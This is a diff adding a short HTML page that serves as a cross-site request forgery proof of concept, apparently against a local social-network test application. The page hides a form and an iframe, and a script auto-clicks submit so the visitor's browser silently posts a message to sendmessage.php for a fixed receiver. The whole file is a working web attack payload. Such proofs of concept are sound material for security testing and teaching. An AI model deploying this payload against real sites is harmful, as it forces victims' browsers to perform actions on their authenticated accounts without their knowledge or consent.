@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style media = "screen">
+        #csrf
+        {
+            display:none;
+        }
+        </style>
+      </head>
+      
+            <iframe style = "display:none" name = "csrf-frame"></iframe>
+            <form method = "post" action = "http://localhost/socialnetwork/sendmessage.php?receiver=39" target = "csrf-frame" id = "csrf">
+            <textarea name = "body" rows = "8" cols = "80"> CSRF MESSAGE </textarea>
+            <input type="submit" name="send" id="submit" value = "Send Message">
+            </form>
+            <script>
+                document.getElementById("submit").click();
+                </script>
+                <!-- <body onload="document.forms[0].submit()">
+                </body> -->
+                </html>
+           
+            
+        
+        
